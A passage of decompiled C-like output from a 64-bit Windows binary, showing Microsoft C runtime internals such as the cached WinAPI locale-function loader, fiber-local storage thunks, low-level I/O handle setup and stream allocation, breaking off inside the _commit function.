FARPROC __fastcall sub_14001CFE0(unsigned int a1, const CHAR *a2, unsigned int *a3, unsigned int *a4)
{
  __int64 v4; // r12
  unsigned int *v6; // rsi
  __int64 v8; // rdi
  HMODULE Library; // rbx
  const WCHAR *v10; // rbp
  FARPROC ProcAddress; // rbx
  __int64 v12; // rax
  DWORD flOldProtect; // [rsp+60h] [rbp+18h] BYREF

  v4 = a1;
  v6 = a3;
  if ( a3 == a4 )
  {
LABEL_12:
    ProcAddress = nullptr;
    goto LABEL_13;
  }
  while ( 1 )
  {
    v8 = *v6;
    Library = (HMODULE)qword_1400A05C0[v8];
    if ( Library == nullptr )
      break;
    if ( Library != (HMODULE)-1LL )
      goto LABEL_20;
LABEL_11:
    if ( ++v6 == a4 )
      goto LABEL_12;
  }
  v10 = off_140092380[v8];
  Library = LoadLibraryExW(v10, nullptr, 0x800u);
  if ( Library == nullptr
    && (GetLastError() != 87
     || (unsigned int)sub_140026080(v10, L"api-ms-", 7) == 0
     || (unsigned int)sub_140026080(v10, L"ext-ms-", 7) == 0
     || (Library = LoadLibraryExW(v10, nullptr, 0)) == nullptr) )
  {
    _InterlockedExchange64(&qword_1400A05C0[v8], -1);
    goto LABEL_11;
  }
  if ( _InterlockedExchange64(&qword_1400A05C0[v8], (__int64)Library) != 0 )
    FreeLibrary(Library);
LABEL_20:
  ProcAddress = GetProcAddress(Library, a2);
LABEL_13:
  _vcrt_lock(14);
  flOldProtect = 0;
  if ( VirtualProtect(qword_1400A5000, 0x100u, 4u, &flOldProtect) )
  {
    v12 = (__int64)ProcAddress;
    if ( ProcAddress == nullptr )
      v12 = -1;
    _InterlockedExchange64(&qword_1400A5000[v4], v12);
    if ( VirtualProtect(qword_1400A5000, 0x100u, 2u, &flOldProtect) )
    {
      _vcrt_unlock(14);
      return ProcAddress;
    }
  }
  abort();
}


// ----- sub_14001D194 @ 0x14001d194 -----
__int64 __fastcall sub_14001D194(__int64 a1)
{
  FARPROC v1; // rax

  v1 = (FARPROC)qword_1400A50D0;
  if ( qword_1400A50D0 != -1
    && (qword_1400A50D0 != 0
     || (v1 = sub_14001CFE0(
                0x1Au,
                "AppPolicyGetProcessTerminationMethod",
                &dword_140092B24,
                (unsigned int *)"AppPolicyGetProcessTerminationMethod")) != nullptr) )
  {
    return ((__int64 (__fastcall *)(__int64, __int64))v1)(-6, a1);
  }
  else
  {
    return 3221226021LL;
  }
}


// ----- sub_14001D1F0 @ 0x14001d1f0 -----
__int64 sub_14001D1F0()
{
  __int64 (*v0)(void); // rax

  v0 = (__int64 (*)(void))qword_1400A5000[0];
  if ( qword_1400A5000[0] != -1
    && (qword_1400A5000[0] != 0
     || (v0 = sub_14001CFE0(0, "AreFileApisANSI", &dword_1400929D8, &dword_1400929DC)) != nullptr) )
  {
    return v0();
  }
  else
  {
    return 1;
  }
}


// ----- sub_14001D23C @ 0x14001d23c -----
int __fastcall sub_14001D23C(
        __int64 a1,
        DWORD a2,
        const WCHAR *a3,
        unsigned int a4,
        const WCHAR *lpString2,
        int cchCount2,
        __int64 a7,
        __int64 a8,
        __int64 a9)
{
  __int64 (__fastcall *v13)(__int64, _QWORD, const WCHAR *, _QWORD, const WCHAR *, int, __int64, __int64, __int64); // rax
  LCID v15; // eax

  v13 = (__int64 (__fastcall *)(__int64, _QWORD, const WCHAR *, _QWORD, const WCHAR *, int, __int64, __int64, __int64))sub_14001CFA8();
  if ( v13 != nullptr )
    return v13(a1, a2, a3, a4, lpString2, cchCount2, a7, a8, a9);
  v15 = sub_14001D6C0(a1, 0);
  return CompareStringW(v15, a2, a3, a4, lpString2, cchCount2);
}


// ----- sub_14001D300 @ 0x14001d300 -----
__int64 __fastcall sub_14001D300(__int64 a1, unsigned int a2, __int64 a3, __int64 a4)
{
  FARPROC v4; // rax
  _BYTE v9[4]; // [rsp+30h] [rbp-28h] BYREF
  int v10; // [rsp+34h] [rbp-24h] BYREF
  int v11; // [rsp+38h] [rbp-20h] BYREF
  __int64 *v12; // [rsp+40h] [rbp-18h] BYREF
  __int64 v13; // [rsp+60h] [rbp+8h] BYREF

  v13 = a1;
  v4 = (FARPROC)qword_1400A5010;
  if ( qword_1400A5010 != -1 )
  {
    if ( qword_1400A5010 != 0 )
      return ((__int64 (__fastcall *)(__int64, _QWORD, __int64, __int64))v4)(v13, a2, a3, a4);
    v4 = sub_14001CFE0(2u, "EnumSystemLocalesEx", (unsigned int *)&unk_140092A08, (unsigned int *)"EnumSystemLocalesEx");
    if ( v4 != nullptr )
      return ((__int64 (__fastcall *)(__int64, _QWORD, __int64, __int64))v4)(v13, a2, a3, a4);
  }
  v12 = &v13;
  v10 = 4;
  v11 = 4;
  return sub_14001CF4C((__int64)v9, &v11, &v12, &v10);
}


// ----- FlsAlloc @ 0x14001d3a4 -----
// attributes: thunk
DWORD __stdcall FlsAlloc(PFLS_CALLBACK_FUNCTION lpCallback)
{
  return __imp_FlsAlloc(lpCallback);
}


// ----- FlsFree @ 0x14001d3ac -----
// attributes: thunk
BOOL __stdcall FlsFree(DWORD dwFlsIndex)
{
  return __imp_FlsFree(dwFlsIndex);
}


// ----- FlsGetValue @ 0x14001d3b4 -----
// attributes: thunk
PVOID __stdcall FlsGetValue(DWORD dwFlsIndex)
{
  return __imp_FlsGetValue(dwFlsIndex);
}


// ----- sub_14001D3BC @ 0x14001d3bc -----
__int64 sub_14001D3BC()
{
  return qword_1400A5018();
}


// ----- FlsSetValue @ 0x14001d3c8 -----
// attributes: thunk
BOOL __stdcall FlsSetValue(DWORD dwFlsIndex, PVOID lpFlsData)
{
  return __imp_FlsSetValue(dwFlsIndex, lpFlsData);
}


// ----- sub_14001D3D0 @ 0x14001d3d0 -----
int __fastcall sub_14001D3D0(__int64 a1, LCTYPE a2, WCHAR *a3, unsigned int a4)
{
  FARPROC v4; // rax
  LCID v10; // eax

  v4 = (FARPROC)qword_1400A5050;
  if ( qword_1400A5050 != -1 )
  {
    if ( qword_1400A5050 != 0 )
      return ((__int64 (__fastcall *)(__int64, _QWORD, WCHAR *, _QWORD))v4)(a1, a2, a3, a4);
    v4 = sub_14001CFE0(0xAu, "GetLocaleInfoEx", (unsigned int *)&unk_140092A58, (unsigned int *)"GetLocaleInfoEx");
    if ( v4 != nullptr )
      return ((__int64 (__fastcall *)(__int64, _QWORD, WCHAR *, _QWORD))v4)(a1, a2, a3, a4);
  }
  v10 = sub_14001D6C0(a1, 0);
  return GetLocaleInfoW(v10, a2, a3, a4);
}


// ----- sub_14001D464 @ 0x14001d464 -----
__int64 __fastcall sub_14001D464(__int64 a1, unsigned int a2)
{
  FARPROC v2; // rax
  LCID UserDefaultLCID; // eax

  v2 = (FARPROC)qword_1400A5070;
  if ( qword_1400A5070 != -1 )
  {
    if ( qword_1400A5070 != 0 )
      return ((__int64 (__fastcall *)(__int64, _QWORD))v2)(a1, a2);
    v2 = sub_14001CFE0(
           0xEu,
           "GetUserDefaultLocaleName",
           (unsigned int *)&unk_140092A88,
           (unsigned int *)"GetUserDefaultLocaleName");
    if ( v2 != nullptr )
      return ((__int64 (__fastcall *)(__int64, _QWORD))v2)(a1, a2);
  }
  UserDefaultLCID = GetUserDefaultLCID();
  return sub_14001D544(UserDefaultLCID, a1, a2, 0);
}


// ----- InitializeCriticalSectionEx @ 0x14001d4d4 -----
// attributes: thunk
BOOL __stdcall InitializeCriticalSectionEx(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount, DWORD Flags)
{
  return __imp_InitializeCriticalSectionEx(lpCriticalSection, dwSpinCount, Flags);
}


// ----- sub_14001D4DC @ 0x14001d4dc -----
int __fastcall sub_14001D4DC(__int64 a1)
{
  FARPROC v1; // rax
  LCID v4; // eax

  v1 = (FARPROC)qword_1400A5088;
  if ( qword_1400A5088 != -1 )
  {
    if ( qword_1400A5088 != 0 )
      return ((__int64 (__fastcall *)(__int64))v1)(a1);
    v1 = sub_14001CFE0(0x11u, "IsValidLocaleName", (unsigned int *)&unk_140092AB0, (unsigned int *)"IsValidLocaleName");
    if ( v1 != nullptr )
      return ((__int64 (__fastcall *)(__int64))v1)(a1);
  }
  v4 = sub_14001D6C0(a1, 0);
  return IsValidLocale(v4, 1u);
}


// ----- sub_14001D544 @ 0x14001d544 -----
__int64 __fastcall sub_14001D544(unsigned int a1, __int64 a2, unsigned int a3, unsigned int a4)
{
  FARPROC v4; // rax

  v4 = (FARPROC)qword_1400A5098;
  if ( qword_1400A5098 != -1
    && (qword_1400A5098 != 0
     || (v4 = sub_14001CFE0(
                0x13u,
                "LCIDToLocaleName",
                (unsigned int *)&unk_140092AE8,
                (unsigned int *)"LCIDToLocaleName")) != nullptr) )
  {
    return ((__int64 (__fastcall *)(_QWORD, __int64, _QWORD, _QWORD))v4)(a1, a2, a3, a4);
  }
  else
  {
    return _acrt_DownlevelLCIDToLocaleName(a1, a2, a3);
  }
}


// ----- sub_14001D5CC @ 0x14001d5cc -----
int __fastcall sub_14001D5CC(
        __int64 a1,
        DWORD a2,
        const WCHAR *a3,
        unsigned int a4,
        WCHAR *lpDestStr,
        int cchDest,
        __int64 a7,
        __int64 a8,
        __int64 a9)
{
  FARPROC v9; // r10
  LCID v15; // eax

  v9 = (FARPROC)qword_1400A5090;
  if ( qword_1400A5090 != -1 )
  {
    if ( qword_1400A5090 != 0 )
      return ((__int64 (__fastcall *)(__int64, _QWORD, const WCHAR *, _QWORD, WCHAR *, int, __int64, __int64, __int64))v9)(
               a1,
               a2,
               a3,
               a4,
               lpDestStr,
               cchDest,
               a7,
               a8,
               a9);
    v9 = sub_14001CFE0(0x12u, "LCMapStringEx", (unsigned int *)&unk_140092AD0, (unsigned int *)"LCMapStringEx");
    if ( v9 != nullptr )
      return ((__int64 (__fastcall *)(__int64, _QWORD, const WCHAR *, _QWORD, WCHAR *, int, __int64, __int64, __int64))v9)(
               a1,
               a2,
               a3,
               a4,
               lpDestStr,
               cchDest,
               a7,
               a8,
               a9);
  }
  v15 = sub_14001D6C0(a1, 0);
  return LCMapStringW(v15, a2, a3, a4, lpDestStr, cchDest);
}


// ----- sub_14001D6C0 @ 0x14001d6c0 -----
__int64 __fastcall sub_14001D6C0(__int64 a1, unsigned int a2)
{
  FARPROC v2; // rax

  v2 = (FARPROC)qword_1400A50A0;
  if ( qword_1400A50A0 != -1
    && (qword_1400A50A0 != 0
     || (v2 = sub_14001CFE0(
                0x14u,
                "LocaleNameToLCID",
                (unsigned int *)&unk_140092B08,
                (unsigned int *)"LocaleNameToLCID")) != nullptr) )
  {
    return ((__int64 (__fastcall *)(__int64, _QWORD))v2)(a1, a2);
  }
  else
  {
    return sub_140027C7C(a1);
  }
}


// ----- __vcrt_thread_attach @ 0x14001d724 -----
__vcrt_bool __cdecl _vcrt_thread_attach()
{
  return sub_14001CFA8() != 0;
}


// ----- sub_14001D738 @ 0x14001d738 -----
FARPROC sub_14001D738()
{
  FARPROC result; // rax

  if ( qword_1400A5000[0] == 0 )
    sub_14001CFE0(0, "AreFileApisANSI", &dword_1400929D8, &dword_1400929DC);
  sub_14001CFA8();
  if ( qword_1400A5010 == 0 )
    sub_14001CFE0(2u, "EnumSystemLocalesEx", (unsigned int *)&unk_140092A08, (unsigned int *)"EnumSystemLocalesEx");
  if ( qword_1400A5028 == 0 )
    sub_14001CFE0(5u, "GetDateFormatEx", (unsigned int *)&unk_140092A40, (unsigned int *)"GetDateFormatEx");
  if ( qword_1400A5050 == 0 )
    sub_14001CFE0(0xAu, "GetLocaleInfoEx", (unsigned int *)&unk_140092A58, (unsigned int *)"GetLocaleInfoEx");
  if ( qword_1400A5068 == 0 )
    sub_14001CFE0(0xDu, "GetTimeFormatEx", (unsigned int *)&unk_140092A70, (unsigned int *)"GetTimeFormatEx");
  if ( qword_1400A5070 == 0 )
    sub_14001CFE0(
      0xEu,
      "GetUserDefaultLocaleName",
      (unsigned int *)&unk_140092A88,
      (unsigned int *)"GetUserDefaultLocaleName");
  if ( qword_1400A5088 == 0 )
    sub_14001CFE0(0x11u, "IsValidLocaleName", (unsigned int *)&unk_140092AB0, (unsigned int *)"IsValidLocaleName");
  if ( qword_1400A5090 == 0 )
    sub_14001CFE0(0x12u, "LCMapStringEx", (unsigned int *)&unk_140092AD0, (unsigned int *)"LCMapStringEx");
  if ( qword_1400A5098 == 0 )
    sub_14001CFE0(0x13u, "LCIDToLocaleName", (unsigned int *)&unk_140092AE8, (unsigned int *)"LCIDToLocaleName");
  result = (FARPROC)qword_1400A50A0;
  if ( qword_1400A50A0 == 0 )
    return sub_14001CFE0(0x14u, "LocaleNameToLCID", (unsigned int *)&unk_140092B08, (unsigned int *)"LocaleNameToLCID");
  return result;
}


// ----- sub_14001D8E0 @ 0x14001d8e0 -----
bool sub_14001D8E0()
{
  DWORD flOldProtect; // [rsp+30h] [rbp+8h] BYREF

  flOldProtect = 0;
  return VirtualProtect(qword_1400A5000, 0x100u, 2u, &flOldProtect);
}


// ----- sub_14001D910 @ 0x14001d910 -----
bool sub_14001D910()
{
  FARPROC v0; // rax
  bool v1; // zf

  if ( qword_1400A5018 == (__int64 (*)(void))-1LL )
  {
    v0 = nullptr;
LABEL_5:
    v1 = v0 == nullptr;
    return !v1;
  }
  v1 = qword_1400A5018 == nullptr;
  if ( qword_1400A5018 == nullptr )
  {
    v0 = sub_14001CFE0(3u, "FlsGetValue2", (unsigned int *)&unk_140092A28, (unsigned int *)"FlsGetValue2");
    goto LABEL_5;
  }
  return !v1;
}


// ----- __acrt_uninitialize_winapi_thunks @ 0x14001d954 -----
char __fastcall _acrt_uninitialize_winapi_thunks(char a1)
{
  __int64 *v1; // rbx
  HMODULE v2; // rcx

  if ( a1 == 0 )
  {
    v1 = qword_1400A05C0;
    do
    {
      v2 = (HMODULE)*v1;
      if ( *v1 != 0 )
      {
        if ( v2 != (HMODULE)-1LL )
          FreeLibrary(v2);
        *v1 = 0;
      }
      ++v1;
    }
    while ( v1 != &qword_1400A0678 );
  }
  return 1;
}


// ----- _fcloseall @ 0x14001d998 -----
int __cdecl fcloseall()
{
  int i; // ebx
  __int64 v1; // rax
  int v3; // [rsp+20h] [rbp-18h]

  v3 = 0;
  _vcrt_lock(8);
  for ( i = 3; i != dword_1400A0160; ++i )
  {
    v1 = *((_QWORD *)Block + i);
    if ( v1 != 0 )
    {
      if ( (*(_DWORD *)(v1 + 20) & 0x2000) != 0 && fclose(*((FILE **)Block + i)) != -1 )
        ++v3;
      DeleteCriticalSection((LPCRITICAL_SECTION)(*((_QWORD *)Block + i) + 48LL));
      free_base(*((void **)Block + i));
      *((_QWORD *)Block + i) = 0;
    }
  }
  _vcrt_unlock(8);
  return v3;
}


// ----- __acrt_stdio_free_buffer_nolock @ 0x14001da4c -----
__int64 __fastcall _acrt_stdio_free_buffer_nolock(__int64 a1)
{
  __int64 result; // rax

  result = *(_DWORD *)(a1 + 20) >> 13;
  if ( (*(_DWORD *)(a1 + 20) & 0x2000) != 0 )
  {
    result = *(_DWORD *)(a1 + 20) >> 6;
    if ( (*(_DWORD *)(a1 + 20) & 0x40) != 0 )
    {
      free_base(*(void **)(a1 + 8));
      _InterlockedAnd((volatile signed __int32 *)(a1 + 20), 0xFFFFFEBF);
      *(_QWORD *)(a1 + 8) = 0;
      *(_QWORD *)a1 = 0;
      *(_DWORD *)(a1 + 16) = 0;
      return 0;
    }
  }
  return result;
}


// ----- sub_14001DA90 @ 0x14001da90 -----
void sub_14001DA90()
{
  LPBYTE v0; // rsi
  __int64 v1; // rdi
  HANDLE *v2; // rbx
  __int64 v3; // rbp
  __int64 v4; // rcx
  __int64 v5; // rdx
  struct _STARTUPINFOW StartupInfo; // [rsp+20h] [rbp-78h] BYREF

  memset(&StartupInfo, 0, sizeof(StartupInfo));
  GetStartupInfoW(&StartupInfo);
  if ( StartupInfo.cbReserved2 != 0 && StartupInfo.lpReserved2 != nullptr )
  {
    v0 = StartupInfo.lpReserved2 + 4;
    v1 = 0x2000;
    v2 = (HANDLE *)&StartupInfo.lpReserved2[*(_DWORD *)StartupInfo.lpReserved2 + 4];
    if ( *(int *)StartupInfo.lpReserved2 < 0x2000 )
      v1 = *(unsigned int *)StartupInfo.lpReserved2;
    _acrt_lowio_ensure_fh_exists((unsigned int)v1);
    if ( (int)v1 > dword_1400A0A80 )
      v1 = (unsigned int)dword_1400A0A80;
    if ( (_DWORD)v1 != 0 )
    {
      v3 = 0;
      do
      {
        if ( *v2 != (HANDLE)-1LL && *v2 != (HANDLE)-2LL && (*v0 & 1) != 0 && ((*v0 & 8) != 0 || GetFileType(*v2) != 0) )
        {
          v4 = qword_1400A0680[v3 >> 6];
          v5 = 9 * (v3 & 0x3F);
          *(_QWORD *)(v4 + 8 * v5 + 40) = *v2;
          *(_BYTE *)(v4 + 8 * v5 + 56) = *v0;
        }
        ++v3;
        ++v0;
        ++v2;
        --v1;
      }
      while ( v1 != 0 );
    }
  }
}


// ----- ?initialize_stdio_handles_nolock@@YAXXZ @ 0x14001db90 -----
void __fastcall initialize_stdio_handles_nolock()
{
  int v0; // esi
  __int64 v1; // r14
  __int64 v2; // rcx
  __int64 v3; // rbx
  __int64 v4; // rdi
  DWORD v5; // ecx
  HANDLE StdHandle; // rax
  HANDLE v7; // rbp
  DWORD FileType; // eax

  v0 = 0;
  v1 = 0;
  do
  {
    v2 = v0 & 0x3F;
    v3 = 9 * v2;
    v4 = qword_1400A0680[(__int64)v0 >> 6];
    if ( *(_QWORD *)(v4 + 72 * v2 + 40) == -2 || *(_QWORD *)(v4 + 72 * v2 + 40) == -1 )
    {
      *(_BYTE *)(v4 + 72 * v2 + 56) = -127;
      if ( v0 != 0 )
      {
        if ( v0 == 1 )
          v5 = -11;
        else
          v5 = -12;
      }
      else
      {
        v5 = -10;
      }
      StdHandle = GetStdHandle(v5);
      v7 = StdHandle;
      if ( (unsigned __int64)StdHandle + 1 > 1 && (FileType = GetFileType(StdHandle)) != 0 )
      {
        *(_QWORD *)(v4 + 8 * v3 + 40) = v7;
        if ( (unsigned __int8)FileType == 2 )
        {
          *(_BYTE *)(v4 + 8 * v3 + 56) |= 0x40u;
        }
        else if ( (unsigned __int8)FileType == 3 )
        {
          *(_BYTE *)(v4 + 8 * v3 + 56) |= 8u;
        }
      }
      else
      {
        *(_BYTE *)(v4 + 8 * v3 + 56) |= 0x40u;
        *(_QWORD *)(v4 + 8 * v3 + 40) = -2;
        if ( Block != nullptr )
          *(_DWORD *)(*(_QWORD *)((char *)Block + v1) + 24LL) = -2;
      }
    }
    else
    {
      *(_BYTE *)(v4 + 72 * v2 + 56) |= 0x80u;
    }
    ++v0;
    v1 += 8;
  }
  while ( v0 != 3 );
}


// ----- __acrt_initialize_lowio @ 0x14001dc98 -----
char _acrt_initialize_lowio()
{
  char v0; // bl

  _vcrt_lock(7);
  v0 = 0;
  if ( (unsigned int)_acrt_lowio_ensure_fh_exists(0) == 0 )
  {
    sub_14001DA90();
    initialize_stdio_handles_nolock();
    v0 = 1;
  }
  _vcrt_unlock(7);
  return v0;
}


// ----- __acrt_uninitialize_lowio @ 0x14001dcd4 -----
char _acrt_uninitialize_lowio()
{
  unsigned __int64 i; // rbx
  void *v1; // rcx

  for ( i = 0; i < 128; ++i )
  {
    v1 = (void *)qword_1400A0680[i];
    if ( v1 != nullptr )
    {
      _acrt_lowio_destroy_handle_array(v1);
      qword_1400A0680[i] = 0;
    }
  }
  return 1;
}


// ----- _fileno @ 0x14001dd14 -----
int __cdecl fileno(FILE *Stream)
{
  if ( Stream != nullptr )
    return Stream->_flag;
  *(_DWORD *)sub_140018888() = 22;
  invalid_parameter_noinfo();
  return -1;
}


// ----- ??$?RV_lambda_ad8af0d99a0adf03d037d7dffe354bb5_@@AEAV_lambda_c9ba49e555ba839a7b07aa3fbecb7617_@@V_lambda_2f1ebd5d68526518146ae959c9e734c8_@@@?$__crt_seh_guarded_call@H@@QEAAH$$QEAV_lambda_ad8af0d99a0adf03d037d7dffe354bb5_@@AEAV_lambda_c9ba49e555ba839a7b07aa3fbecb7617_@@$$QEAV_lambda_2f1ebd5d68526518146ae959c9e734c8_@@@Z @ 0x14001dd3c -----
__int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_ad8af0d99a0adf03d037d7dffe354bb5_,_lambda_c9ba49e555ba839a7b07aa3fbecb7617_ &,_lambda_2f1ebd5d68526518146ae959c9e734c8_>(
        __int64 a1,
        unsigned int *a2,
        int **a3,
        unsigned int *a4)
{
  int *v6; // rdx
  unsigned int v7; // ebx

  _acrt_lowio_lock_fh(*a2);
  v6 = a3[1];
  if ( (*(_BYTE *)(qword_1400A0680[(__int64)**a3 >> 6] + 72LL * (**a3 & 0x3F) + 56) & 1) != 0 )
  {
    v7 = close_nolock_internal(**a3, v6);
  }
  else
  {
    *((_BYTE *)v6 + 48) = 1;
    v6[11] = 9;
    v7 = -1;
  }
  _acrt_lowio_unlock_fh(*a4);
  return v7;
}


// ----- sub_14001DDB4 @ 0x14001ddb4 -----
__int64 __fastcall sub_14001DDB4(int a1, __int64 a2)
{
  int v3; // [rsp+30h] [rbp-28h] BYREF
  int *v4[4]; // [rsp+38h] [rbp-20h] BYREF
  int v5; // [rsp+60h] [rbp+8h] BYREF
  char v6; // [rsp+70h] [rbp+18h] BYREF
  int v7; // [rsp+78h] [rbp+20h] BYREF

  v5 = a1;
  if ( a1 == -2 )
  {
    *(_BYTE *)(a2 + 56) = 1;
    *(_DWORD *)(a2 + 52) = 0;
    *(_BYTE *)(a2 + 48) = 1;
    *(_DWORD *)(a2 + 44) = 9;
  }
  else
  {
    if ( a1 >= 0
      && a1 < (unsigned int)dword_1400A0A80
      && (*(_BYTE *)(qword_1400A0680[(__int64)a1 >> 6] + 72LL * (a1 & 0x3F) + 56) & 1) != 0 )
    {
      v4[1] = (int *)a2;
      v7 = a1;
      v3 = a1;
      v4[0] = &v5;
      return __crt_seh_guarded_call<int>::operator()<_lambda_ad8af0d99a0adf03d037d7dffe354bb5_,_lambda_c9ba49e555ba839a7b07aa3fbecb7617_ &,_lambda_2f1ebd5d68526518146ae959c9e734c8_>(
               (__int64)&v6,
               (unsigned int *)&v3,
               v4,
               (unsigned int *)&v7);
    }
    *(_BYTE *)(a2 + 56) = 1;
    *(_DWORD *)(a2 + 52) = 0;
    *(_BYTE *)(a2 + 48) = 1;
    *(_DWORD *)(a2 + 44) = 9;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, (__crt_cached_ptd_host *)a2);
  }
  return 0xFFFFFFFFLL;
}


// ----- _close_nolock @ 0x14001de78 -----
__int64 __fastcall close_nolock(__int64 a1)
{
  unsigned int v1; // edi
  int v2; // ebx
  int v3; // ebx
  _QWORD v5[2]; // [rsp+20h] [rbp-40h] BYREF
  char v6; // [rsp+30h] [rbp-30h]
  __int128 v7; // [rsp+38h] [rbp-28h]
  char v8; // [rsp+48h] [rbp-18h]
  int v9; // [rsp+4Ch] [rbp-14h]
  char v10; // [rsp+50h] [rbp-10h]
  int v11; // [rsp+54h] [rbp-Ch]
  char v12; // [rsp+58h] [rbp-8h]

  v5[0] = 0;
  v6 = 0;
  v8 = 0;
  v10 = 0;
  v12 = 0;
  if ( dword_1400A0560 == 0 )
  {
    v8 = 1;
    v7 = *(_OWORD *)&off_14009ECA8;
  }
  v1 = close_nolock_internal(a1, v5);
  if ( v8 == 2 )
    *(_DWORD *)(v5[0] + 936LL) &= ~2u;
  if ( v10 != 0 )
  {
    v2 = v9;
    *(_DWORD *)(unknown_libname_79((__int64)v5) + 32) = v2;
  }
  if ( v12 != 0 )
  {
    v3 = v11;
    *(_DWORD *)(unknown_libname_79((__int64)v5) + 36) = v3;
  }
  return v1;
}


// ----- _close_nolock_internal @ 0x14001df10 -----
__int64 __fastcall close_nolock_internal(int a1, __int64 a2)
{
  __int64 v2; // rdi
  DWORD LastError; // ebx
  intptr_t osfhandle; // rbx
  void *v6; // rax

  v2 = a1;
  if ( get_osfhandle(a1) == -1
    || ((_DWORD)v2 == 1 && (*(_BYTE *)(qword_1400A0680[0] + 200) & 1) != 0
     || (_DWORD)v2 == 2 && (*(_BYTE *)(qword_1400A0680[0] + 128) & 1) != 0)
    && (osfhandle = get_osfhandle(2), get_osfhandle(1) == osfhandle)
    || (v6 = (void *)get_osfhandle(v2), CloseHandle(v6)) )
  {
    LastError = 0;
  }
  else
  {
    LastError = GetLastError();
  }
  free_osfhnd((unsigned int)v2);
  *(_BYTE *)(qword_1400A0680[v2 >> 6] + 72 * (v2 & 0x3F) + 56) = 0;
  if ( LastError == 0 )
    return 0;
  _acrt_errno_map_os_error_ptd(LastError, a2);
  return 0xFFFFFFFFLL;
}


// ----- ?__acrt_stdio_allocate_stream@@YA?AV__crt_stdio_stream@@XZ @ 0x14001dfe0 -----
_QWORD *__fastcall __acrt_stdio_allocate_stream(_QWORD *a1)
{
  __int64 v2; // rax
  char v4; // [rsp+30h] [rbp+8h] BYREF

  *a1 = 0;
  _vcrt_lock(8);
  v2 = *(_QWORD *)sub_14001E054(&v4);
  *a1 = v2;
  if ( v2 != 0 )
  {
    *(_DWORD *)(v2 + 16) = 0;
    *(_QWORD *)(v2 + 40) = 0;
    *(_QWORD *)v2 = 0;
    *(_QWORD *)(v2 + 8) = 0;
    *(_DWORD *)(v2 + 24) = -1;
  }
  _vcrt_unlock(8);
  return a1;
}


// ----- ?__acrt_stdio_free_stream@@YAXV__crt_stdio_stream@@@Z @ 0x14001e038 -----
__int64 __fastcall __acrt_stdio_free_stream(__int64 a1)
{
  *(_DWORD *)(a1 + 24) = -1;
  *(_QWORD *)a1 = 0;
  *(_QWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 16) = 0;
  *(_QWORD *)(a1 + 28) = 0;
  *(_QWORD *)(a1 + 40) = 0;
  return (unsigned int)_InterlockedExchange((volatile __int32 *)(a1 + 20), 0);
}


// ----- sub_14001E054 @ 0x14001e054 -----
FILE **__fastcall sub_14001E054(FILE **a1)
{
  FILE **v2; // rdi
  FILE **v3; // rbp
  FILE *v4; // rbx
  signed __int32 base_high; // eax
  signed __int32 v6; // ett

  v2 = (FILE **)((char *)Block + 24);
  v3 = (FILE **)((char *)Block + 8 * dword_1400A0160);
  while ( 1 )
  {
    if ( v2 == v3 )
      goto LABEL_10;
    v4 = *v2;
    if ( *v2 == nullptr )
      break;
    if ( (HIDWORD(v4->_base) & 0x2000) == 0 )
    {
      lock_file(*v2);
      _m_prefetchw((char *)&v4->_base + 4);
      base_high = HIDWORD(v4->_base);
      do
      {
        v6 = base_high;
        base_high = _InterlockedCompareExchange(
                      (volatile signed __int32 *)&v4->_base + 1,
                      base_high | 0x2000,
                      base_high);
      }
      while ( v6 != base_high );
      if ( (base_high & 0x2000) == 0 )
        goto LABEL_12;
      unlock_file(v4);
    }
    ++v2;
  }
  *v2 = (FILE *)calloc_base(1u, 0x58u);
  free_base(nullptr);
  if ( *v2 == nullptr )
  {
LABEL_10:
    *a1 = nullptr;
    return a1;
  }
  (*v2)->_flag = -1;
  InitializeCriticalSectionEx((LPCRITICAL_SECTION)&(*v2)[1], 0xFA0u, 0);
  v4 = *v2;
  _InterlockedOr((volatile signed __int32 *)&(*v2)->_base + 1, 0x2000u);
  lock_file(v4);
LABEL_12:
  *a1 = v4;
  return a1;
}


// ----- ??$?RV_lambda_a37b2b86f63e897a80ea819b0eb08c01_@@AEAV_lambda_38ce7e780aa69e748d6df282ebc68efe_@@V_lambda_99fb1378e971ab6e7edea83e3a7a83a2_@@@?$__crt_seh_guarded_call@H@@QEAAH$$QEAV_lambda_a37b2b86f63e897a80ea819b0eb08c01_@@AEAV_lambda_38ce7e780aa69e748d6df282ebc68efe_@@$$QEAV_lambda_99fb1378e971ab6e7edea83e3a7a83a2_@@@Z @ 0x14001e140 -----
__int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_a37b2b86f63e897a80ea819b0eb08c01_,_lambda_38ce7e780aa69e748d6df282ebc68efe_ &,_lambda_99fb1378e971ab6e7edea83e3a7a83a2_>(
        __int64 a1,
        unsigned int *a2,
        int **a3,
        unsigned int *a4)
{
  void *osfhandle; // rax
  unsigned int v7; // ebx
  DWORD LastError; // ebx

  _acrt_lowio_lock_fh(*a2);
  if ( (*(_BYTE *)(qword_1400A0680[(__int64)**a3 >> 6] + 72LL * (**a3 & 0x3F) + 56) & 1) == 0 )
    goto LABEL_4;
  osfhandle = (void *)get_osfhandle(**a3);
  v7 = 0;
  if ( !FlushFileBuffers(osfhandle) )
  {
    LastError = GetLastError();
    *(_DWORD *)sub_140018864() = LastError;
LABEL_4:
    *(_DWORD *)sub_140018888() = 9;
    v7 = -1;
  }
  _acrt_lowio_unlock_fh(*a4);
  return v7;
}


// ----- _commit @ 0x14001e1cc -----
int __cdecl commit(int FileHandle)
{
  int *v2; // [rsp+20h] [rbp-18h] BYREF
  int v3; // [rsp+40h] [rbp+8h] BYREF
  char v4; // [rsp+48h] [rbp+10h] BYREF
  int v5; // [rsp+50h] [rbp+18h] BYREF
  int v6; // [rsp+58h] [rbp+20h] BYREF

  v3 = FileHandle;
  if ( FileHandle == -2 )
  {
    *(_DWORD *)sub_140018888() = 9;
  }
  else
  {
    if ( FileHandle >= 0
      && FileHandle < (unsigned int)dword_1400A0A80
      && (*(_BYTE *)(qword_1400A0680[(__int64)FileHandle >> 6] + 72LL * (FileHandle & 0x3F) + 56) & 1) != 0 )
    {
      v5 = FileHandle;
      v6 = FileHandle;
      v2 = &v3;
      return __crt_seh_guarded_call<int>::operator()<_lambda_a37b2b86f63e897a80ea819b0eb08c01_,_lambda_38ce7e780aa69e748d6df282ebc68efe_ &,_lambda_99fb1378e971ab6e7edea83e3a7a83a2_>(
               (__int64)&v4,
               (unsigned int *)&v6,
               &v2,
               (unsigned int *)&v5);
    }
